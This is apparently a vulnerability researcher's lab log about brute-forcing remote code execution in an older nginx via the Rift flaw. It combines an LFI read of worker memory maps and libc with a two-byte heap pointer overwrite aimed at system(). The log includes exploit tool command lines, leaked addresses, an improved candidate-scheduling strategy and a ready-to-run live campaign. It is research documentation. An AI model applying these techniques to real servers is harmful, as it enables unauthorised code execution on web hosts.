# Rift Maps-Only Side-Track Log

Started: 2026-05-21
Branch context: `research/nginx-1311-new-vuln-hunt`
Scope: CVE-2026-42945/Rift side track only.

This is not the Nebusec `nginx/1.31.1` new-vulnerability path. Official
NGINX `1.31.1` contains the disclosed Rift fix, so this file tracks only the
older Rift/LFI maps-only question under realistic Ubuntu defaults.

## Constraints

- Do not change `kernel.yama.ptrace_scope`.
- Do not rely on `/proc/<pid>/mem`.
- Do not rely on core dumps.
- Do not disable ASLR.
- Do not use debugger or target shell data.
- Allowed for this side track: LFI-readable `/proc/<worker>/maps`, LFI-read
  libc-on-disk, and marker-file proof read back through the same LFI primitive.

## 2026-05-21 Artifact Review

Reviewed:

- `tools/maps_only_bruteforce_exploit.py`
- `artifacts/maps_only_dense_sled_campaign1_20260520.cast`
- `artifacts/maps_only_dense_sled_campaign1_20260520.gif`
- prior Rift logs for context only, without treating core-derived candidates as
  admissible maps-only proof.

The stopped dense-sled campaign used:

```text
python3 tools/maps_only_bruteforce_exploit.py \
  --target 192.168.1.205:19321 \
  --cmd id \
  --max-candidates 6000 \
  --progress-every 250 \
  --proof-delay 0.05 \
  --recovery-timeout 20 \
  --time-budget 7200
```

Observed from the cast:

- Primitive: LFI maps/libc plus marker proof; no `/proc/<pid>/mem`; no core
  parsing.
- Heap ranges:
  - `0x55e421058000-0x55e4210db000`
  - `0x55e420ff3000-0x55e421058000`
- Libc base: `0x7fca47a6d000`
- `system()`: `0x7fca47abdd70`
- Sled: shared-command, stride `32`, phase `0`, `122` slots.
- Candidate pass: address modulo `7`, `6000` selected candidates.
- Progress reached a printed `try=1000` line before termination with no marker
  proof. The older note says stopped after `750`; the cast itself contains a
  later `try=1000` progress line.
- Effective rate after startup was about `0.79` attempts/second.

## Why It Did Not Hit Quickly

The main issue was candidate scheduling. With a two-byte overwrite, the high
bytes of the victim cleanup pointer are preserved. That makes each `64 KiB`
window a distinct hypothesis. The original campaign linearly consumed safe
addresses in early heap windows before touching later windows.

Using the recorded ranges, the linear modulo-7 schedule has `11,750` safe
candidates. At `0.79` attempts/second, one modulo class alone is roughly four
hours if fully exhausted. All URI-safe low two-byte candidates across all modulo
classes are `92,825` attempts, roughly `32` hours at the same rate, before
adding phase or retry multipliers.

As a diagnostic only, the prior Vagrant reset-core path had found a winning
address `0x55e4210b2127`. That address is not admissible evidence for this
maps-only side track, because it came from a non-maps-only path. It is useful to
explain the stopped campaign: under the original linear order it appears at
candidate index `3951`, well past the `750`/`1000` attempts that were actually
run. Under a `64 KiB` window round-robin order, the same address appears at
index `6`.

Other limits remain:

- The campaign still used only `address_mod=7`.
- It used only one sled phase. If the fake cleanup starts at a different body
  phase, the run can miss even with the right heap window.
- Maps reveal mapped ranges and library bases, but they do not reveal live
  request-body placement or the preserved high bytes of the victim cleanup
  pointer. Without `/proc/<pid>/mem`, core dumps, or another leak/oracle, this
  remains a probabilistic search.

## Implemented Bounded Improvement

Added `tools/rift_maps_only_bruteforce_v2.py`.

Changes relative to the original prototype:

- Keeps the same allowed primitive: LFI maps/libc plus marker proof.
- Prints explicit scope: Rift side track, not the `nginx/1.31.1` Nebusec path.
- Defaults to `64 KiB` window round-robin candidate scheduling, so early
  attempts cover preserved-high-byte hypotheses instead of exhausting the first
  heap window.
- Supports bounded phase sweeps with `--body-phases`, for example `0,8,16`.
- Supports `--priority-address` for explicitly labelled calibration reruns.
  Any such run must document whether the priority came from admissible maps-only
  information or from a disallowed diagnostic source.
- Supports offline planning with `--candidate-range`, so scheduling changes can
  be reviewed without target traffic.
- Supports `--explain-address` to show where a diagnostic address falls in the
  chosen schedule.

Example offline comparison from the stopped campaign ranges:

```text
python3 tools/rift_maps_only_bruteforce_v2.py \
  --candidate-range '0x55e421058000-0x55e4210db000:heap-high' \
  --candidate-range '0x55e420ff3000-0x55e421058000:heap-low' \
  --address-mods 7 \
  --target-len 2 \
  --candidate-order linear \
  --max-candidates 6000 \
  --explain-address 0x55e4210b2127 \
  --preview-candidates 5
```

Result: diagnostic address index `3951`.

```text
python3 tools/rift_maps_only_bruteforce_v2.py \
  --candidate-range '0x55e421058000-0x55e4210db000:heap-high' \
  --candidate-range '0x55e420ff3000-0x55e421058000:heap-low' \
  --address-mods 7 \
  --target-len 2 \
  --candidate-order window-round-robin \
  --max-candidates 64 \
  --explain-address 0x55e4210b2127 \
  --preview-candidates 12
```

Result: diagnostic address index `6`, with the first candidates spread across
heap windows:

```text
0x55e421062127 0x55e421072127 0x55e421082127 0x55e421092127
0x55e4210a2127 0x55e4210b2127 0x55e4210c2127 0x55e4210d2127
```

## Test Status

No live exploit campaign was run on 2026-05-21, so no new asciinema/GIF artifact
was created. Verification was limited to syntax/help checks and offline planning
against the stopped campaign's printed heap ranges.

Commands run:

```text
python3 -m py_compile tools/rift_maps_only_bruteforce_v2.py
python3 tools/rift_maps_only_bruteforce_v2.py --help
python3 tools/rift_maps_only_bruteforce_v2.py --candidate-range ... --candidate-order linear ...
python3 tools/rift_maps_only_bruteforce_v2.py --candidate-range ... --candidate-order window-round-robin ...
python3 tools/rift_maps_only_bruteforce_v2.py --candidate-range ... --address-mods all ...
python3 tools/rift_maps_only_bruteforce_v2.py --candidate-range ... --body-phases 0,8,16 ...
```

## Next Bounded Live Run

If resumed live, keep the run recorded and capped. A reasonable first pass is:

```text
TERM=xterm-256color asciinema record --overwrite --return \
  --idle-time-limit 1 --window-size 132x38 \
  --title "Rift maps-only round-robin smoke ptrace_scope=1" \
  --command "python3 tools/rift_maps_only_bruteforce_v2.py \
    --target 192.168.1.205:19321 \
    --cmd id \
    --max-candidates 128 \
    --candidate-order window-round-robin \
    --address-mods 7 \
    --body-phases 0 \
    --progress-every 16 \
    --proof-delay 0.05 \
    --recovery-timeout 20 \
    --time-budget 600" \
  artifacts/rift_maps_only_roundrobin_smoke_YYYYMMDD.cast
```

Then convert the cast to GIF:

```text
agg --theme monokai --idle-time-limit 1 --last-frame-duration 4 \
  --cols 132 --rows 38 \
  artifacts/rift_maps_only_roundrobin_smoke_YYYYMMDD.cast \
  artifacts/rift_maps_only_roundrobin_smoke_YYYYMMDD.gif
```

Do not leave a long-running session open.
